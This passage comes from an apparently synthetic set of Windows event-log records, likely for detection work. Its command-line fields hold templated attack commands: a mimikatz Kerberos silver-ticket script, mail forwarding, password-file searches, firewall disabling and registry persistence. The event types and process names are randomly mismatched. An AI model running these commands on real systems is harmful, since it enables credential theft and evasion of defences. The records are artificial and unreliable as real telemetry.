        "SourceImage": "C:\\Program Files\\simple..exe",
        "DestinationProcessID": 2927,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\site..exe",
        "UtcTime": "2024-05-17T01:36:51.857586Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-50.mitchell-shea.com",
        "User": "ashley50",
        "ProcessID": 2018,
        "ProcessName": "nc.exe",
        "CommandLine": "\"cscript \\\"#{vbscript}\\\" > $env:TEMP\\\\T1059.005.out.txt\\n\",",
        "LogonID": 115067,
        "LogonGuid": "ebf1d5e2-12e9-4626-a924-4e92ec4673e5",
        "SourceProcessID": 8512,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\response..exe",
        "DestinationProcessID": 8272,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\senior..exe",
        "UtcTime": "2024-05-17T01:36:51.857586Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-51.hardin.biz",
        "User": "courtney33",
        "ProcessID": 7353,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"import -window root #{output_file}\\n\",",
        "LogonID": 749784,
        "LogonGuid": "27082ae3-841b-436f-95cc-4e0e0cc8e9c2",
        "SourceProcessID": 4054,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\energy..dll",
        "DestinationProcessID": 1525,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\not..dll",
        "UtcTime": "2024-05-17T01:36:51.857586Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-78.martin.biz",
        "User": "gregory16",
        "ProcessID": 8183,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"$secure_pwd = \\\"#{password}\\\" | ConvertTo-SecureString -AsPlainText -Force\\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \\\"#{username}\\\", $secure_pwd\\nConnect-ExchangeOnline -Credential $creds\\nNew-InboxRule -Name \\\"#{rule_name}\\\" -ForwardTo \\\"#{forwarding_email}\\\"\\n\",",
        "LogonID": 525925,
        "LogonGuid": "3dc61606-d8e6-4556-a364-aba255189df5",
        "SourceProcessID": 8618,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\without..exe",
        "DestinationProcessID": 3482,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\occur..dll",
        "UtcTime": "2024-05-17T01:36:51.857586Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-54.gardner.info",
        "User": "pmartinez",
        "ProcessID": 7314,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"Remove-Item $env:TEMP\\\\silver.bat -ErrorAction Ignore\\nRemove-Item $env:TEMP\\\\silver.txt -ErrorAction Ignore\\n\\n# get current domain SID if default was used\\n$domain_sid = \\\"#{domain_sid}\\\"\\nIf ($domain_sid -Match \\\"DEFAULT\\\") {\\n  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60\\n  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain\\n  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value\\n  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))\\n}\\n\\n# create batch file with commands to run in a separate \\\"runas /netonly\\\" session\\n# so we don't purge Kerberos ticket from the current Windows session\\n# its output goes to silver.txt temp file, because we cannot capture \\\"runas /netonly\\\" output otherwise\\n@\\\"\\n>%TEMP%\\\\silver.txt 2>&1 (\\n  echo Purge existing tickets and create silver ticket:\\n  klist purge\\n  #{mimikatz_path} \\\"kerberos::golden /domain:#{domain} /sid:DOMAIN_SID /aes256:#{service_aes256_key} /user:#{account} /service:HOST /target:#{target}.#{domain} /ptt\\\" \\\"exit\\\"\\n\\n  echo.\\n  echo executing:schtasks /query /S #{target}.#{domain}\\n  schtasks /query /S #{target}.#{domain}\\n  \\n  echo.\\n  echo Tickets after requesting schtasks:\\n  klist\\n\\n  echo.\\n  echo End of Silver Ticket attack\\n)\\n\\\"@ -Replace \\\"DOMAIN_SID\\\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\\\silver.bat\\n\\n# run batch file in a new empty session (password and username do not matter)\\necho \\\"foo\\\" | runas /netonly /user:fake \\\"$env:TEMP\\\\silver.bat\\\" | Out-Null\\n\\n# wait until the output file has logged the entire attack\\ndo {\\n  Start-Sleep 1 # wait a bit so the output file has time to be created\\n  Get-Content -Path \\\"$env:TEMP\\\\silver.txt\\\" -Wait | ForEach-Object {\\n    if ($_ -match 'End of Silver Ticket attack') { break } \\n  }\\n} while ($false) # dummy loop so that 'break' can be used\\n\\n# show output from new empty session\\nGet-Content $env:TEMP\\\\silver.txt\\n\\n# cleanup temp files\\nRemove-Item $env:TEMP\\\\silver.bat -ErrorAction Ignore\\nRemove-Item $env:TEMP\\\\silver.txt -ErrorAction Ignore\\n\",",
        "LogonID": 546633,
        "LogonGuid": "50b5b3c4-006b-44b4-b9ab-33b7047ccbcd",
        "SourceProcessID": 2435,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\born..exe",
        "DestinationProcessID": 4394,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\book..exe",
        "UtcTime": "2024-05-17T01:36:51.858586Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-65.brown-harrison.com",
        "User": "wallaceroy",
        "ProcessID": 2807,
        "ProcessName": "malware.exe",
        "CommandLine": "\"Invoke-WebRequest -OutFile C:\\\\Users\\\\$env:username\\\\Desktop\\\\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe\\n$file1 = \\\"C:\\\\Users\\\\\\\" + $env:username + \\\"\\\\Desktop\\\\TeamViewer_Setup.exe\\\"\\nStart-Process -Wait $file1 /S; \\nStart-Process 'C:\\\\Program Files (x86)\\\\TeamViewer\\\\TeamViewer.exe'\\n\",",
        "LogonID": 812752,
        "LogonGuid": "778edbeb-b3c6-4d75-9d60-270f9e4aaeeb",
        "SourceProcessID": 3377,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\even..exe",
        "DestinationProcessID": 2020,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\always..dll",
        "UtcTime": "2024-05-17T01:36:51.858586Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-75.gonzalez.com",
        "User": "andersonsavannah",
        "ProcessID": 5922,
        "ProcessName": "nc.exe",
        "CommandLine": "\"screencapture #{output_file}\\n\",",
        "LogonID": 177046,
        "LogonGuid": "a4df9534-49f5-4b70-9de3-1512727b09c3",
        "SourceProcessID": 8946,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\until..exe",
        "DestinationProcessID": 8312,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\nature..dll",
        "UtcTime": "2024-05-17T01:36:51.858586Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-36.walker.info",
        "User": "matthewanderson",
        "ProcessID": 8531,
        "ProcessName": "nc.exe",
        "CommandLine": "\"New-Item -Path \\\"C:\\\\Users\\\\$env:USERNAME\\\\AppData\\\\Local\\\\Comms\\\\Unistore\\\\data\\\\copy\\\" -ItemType Directory -ErrorAction Ignore\\nGet-ChildItem -Path \\\"C:\\\\Users\\\\$env:USERNAME\\\\AppData\\\\Local\\\\Comms\\\\Unistore\\\\data\\\" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination \\\"C:\\\\Users\\\\$env:USERNAME\\\\AppData\\\\Local\\\\Comms\\\\Unistore\\\\data\\\\copy\\\" -Recurse -Force -ErrorAction Ignore }\\nRemove-Item -Path \\\"C:\\\\Users\\\\$env:USERNAME\\\\AppData\\\\Local\\\\Comms\\\\Unistore\\\\data\\\\copy\\\" -Recurse -Force -ErrorAction Ignore\\n\",",
        "LogonID": 138361,
        "LogonGuid": "ded9be6a-3917-496b-ad70-151be10a37ea",
        "SourceProcessID": 4618,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\million..dll",
        "DestinationProcessID": 6457,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\security..exe",
        "UtcTime": "2024-05-17T01:36:51.858586Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-68.joseph-allen.com",
        "User": "markfranco",
        "ProcessID": 5371,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"mkdir $HOME/...\\ncp $(which sh) $HOME/...\\n$HOME/.../sh -c \\\"echo #{test_message}\\\"\\n\",",
        "LogonID": 176811,
        "LogonGuid": "8606669d-da2b-4111-9ac7-e1bdc1572864",
        "SourceProcessID": 4042,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\teacher..exe",
        "DestinationProcessID": 8465,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\court..dll",
        "UtcTime": "2024-05-17T01:36:51.858586Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-66.webster.biz",
        "User": "kingjames",
        "ProcessID": 5523,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"aws iam create-user --user-name #{username}\\n\",",
        "LogonID": 726557,
        "LogonGuid": "85b60f09-6916-4eaf-b161-077468670434",
        "SourceProcessID": 8311,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\remember..exe",
        "DestinationProcessID": 1935,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\goal..exe",
        "UtcTime": "2024-05-17T01:36:51.859586Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-82.ferguson.com",
        "User": "alice42",
        "ProcessID": 7900,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"cp #{payload} /tmp/hello.c\\nsudo chown root /tmp/hello.c\\nsudo make /tmp/hello\\nsudo chown root /tmp/hello\\nsudo chmod u+s /tmp/hello\\n/tmp/hello\\n\",",
        "LogonID": 255149,
        "LogonGuid": "f5909bf8-1c18-4766-8ed4-d69959346b76",
        "SourceProcessID": 8084,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\system..exe",
        "DestinationProcessID": 9711,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\trade..dll",
        "UtcTime": "2024-05-17T01:36:51.859586Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-23.howell-king.com",
        "User": "icook",
        "ProcessID": 2874,
        "ProcessName": "malware.exe",
        "CommandLine": "\"reg add \\\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Office\\\\16.0\\\\Outlook\\\\Security\\\\Level\\\" /t REG_DWORD /d 1 /f\\nmkdir  %APPDATA%\\\\Microsoft\\\\Outlook\\\\ >nul 2>&1\\necho \\\"Atomic Red Team TEST\\\" > %APPDATA%\\\\Microsoft\\\\Outlook\\\\VbaProject.OTM\\n\",",
        "LogonID": 155557,
        "LogonGuid": "6adfa598-6ac3-4f9d-9404-91e8b0cff9b2",
        "SourceProcessID": 1110,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\you..exe",
        "DestinationProcessID": 9038,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\out..dll",
        "UtcTime": "2024-05-17T01:36:51.859586Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-77.carroll-gonzalez.info",
        "User": "ebenton",
        "ProcessID": 7548,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"cmd.exe /Q /c #{command_to_execute} 1> \\\\\\\\127.0.0.1\\\\ADMIN$\\\\#{output_file} 2>&1\\n\",",
        "LogonID": 975867,
        "LogonGuid": "26d0e8ba-b4e1-40ad-96c1-738f368b4526",
        "SourceProcessID": 7282,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\every..exe",
        "DestinationProcessID": 1476,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\voice..dll",
        "UtcTime": "2024-05-17T01:36:51.859586Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-57.martin.com",
        "User": "kimberlytaylor",
        "ProcessID": 8123,
        "ProcessName": "nc.exe",
        "CommandLine": "\"hostname\\n\",",
        "LogonID": 812993,
        "LogonGuid": "efc2364f-01be-48de-99e5-b5bbdc97a7cd",
        "SourceProcessID": 5385,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\bag..exe",
        "DestinationProcessID": 4276,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\month..exe",
        "UtcTime": "2024-05-17T01:36:51.859586Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-54.miles.net",
        "User": "kimberly03",
        "ProcessID": 1477,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"findstr /si pass *.xml *.doc *.txt *.xls\\nls -R | select-string -ErrorAction SilentlyContinue -Pattern password\\n\",",
        "LogonID": 639978,
        "LogonGuid": "c48f52ab-0579-4ae9-b45b-de93a1132c91",
        "SourceProcessID": 6784,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\model..dll",
        "DestinationProcessID": 4669,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\real..dll",
        "UtcTime": "2024-05-17T01:36:51.860587Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-45.castillo.info",
        "User": "cmccullough",
        "ProcessID": 9626,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"reg add \\\"HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall\\\\DomainProfile\\\" /v EnableFirewall /t REG_DWORD /d 0 /f\\nreg add \\\"HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall\\\\StandardProfile\\\" /v EnableFirewall /t REG_DWORD /d 0 /f\\n\",",
        "LogonID": 872955,
        "LogonGuid": "e3556c97-4f4e-498e-8eaf-50d0ec52c655",
        "SourceProcessID": 2747,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\hold..dll",
        "DestinationProcessID": 3359,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\they..dll",
        "UtcTime": "2024-05-17T01:36:51.860587Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "email-23.ward-owens.com",
        "User": "christine89",
        "ProcessID": 1794,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"reg add \\\"hklm\\\\system\\\\currentcontrolset\\\\control\\\\print\\\\monitors\\\\AtomicRedTeam\\\" /v \\\"Driver\\\" /d \\\"#{monitor_dll}\\\" /t REG_SZ /f\\n\",",
        "LogonID": 595430,
        "LogonGuid": "ba3f4b19-2598-4b8d-afb7-afe312696137",
        "SourceProcessID": 8961,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\American..exe",
        "DestinationProcessID": 4537,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\decide..dll",
        "UtcTime": "2024-05-17T01:36:51.860587Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-14.ray-herrera.biz",
        "User": "fpotter",
        "ProcessID": 5186,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"$target = $env:LOGONSERVER\\n$target = $target.Trim(\\\"\\\\\\\\\\\")\\n$IpAddress = [System.Net.Dns]::GetHostAddresses($target) | select IPAddressToString -ExpandProperty IPAddressToString\\nwmic.exe /node:$IpAddress process call create 'wevtutil epl Security C:\\\\\\\\ntlmusers.evtx /q:\\\\\\\"Event[System[(EventID=4776)]]\\\"'\",",
        "LogonID": 582237,
        "LogonGuid": "a36c7754-3264-4b42-a1c4-537d1ade949b",
        "SourceProcessID": 4355,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\bank..exe",
        "DestinationProcessID": 1529,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\perhaps..dll",
        "UtcTime": "2024-05-17T01:36:51.860587Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-73.cortez.net",
        "User": "rodriguezbrandon",
        "ProcessID": 3838,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"ps aux | egrep 'falcond|nessusd|cbagentd|td-agent|packetbeat|filebeat|auditbeat|osqueryd'\\n\",",
        "LogonID": 359618,
        "LogonGuid": "08c469db-41ef-4bcd-a819-3ce85b37b555",
        "SourceProcessID": 3070,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\check..exe",
        "DestinationProcessID": 5480,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\half..dll",
        "UtcTime": "2024-05-17T01:36:51.860587Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-65.quinn-thompson.net",
        "User": "davidmarshall",
        "ProcessID": 1361,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"cmd /c \\\"for /l %x in (1,1,#{max_to_print}) do start wordpad.exe /p #{file_to_print}\\\" | out-null\\n\",",
        "LogonID": 582906,
        "LogonGuid": "0744f361-f127-47b8-9ce6-c75dd6f4ea7c",
        "SourceProcessID": 2408,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\card..exe",
        "DestinationProcessID": 2623,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\face..dll",
        "UtcTime": "2024-05-17T01:36:51.861586Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-21.long.com",
        "User": "wrightmelissa",
        "ProcessID": 5613,
        "ProcessName": "nc.exe",
        "CommandLine": "\"reg add \\\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Event Viewer\\\" /v MicrosoftRedirectionURL /t REG_SZ /d \\\"#{redirection_url}\\\" /f\",",
        "LogonID": 951276,
        "LogonGuid": "2983a1fd-2479-4da1-a0db-6b8f5f3c3e12",
        "SourceProcessID": 5463,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\three..dll",
        "DestinationProcessID": 5868,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\bag..dll",
        "UtcTime": "2024-05-17T01:36:51.861586Z"
    },
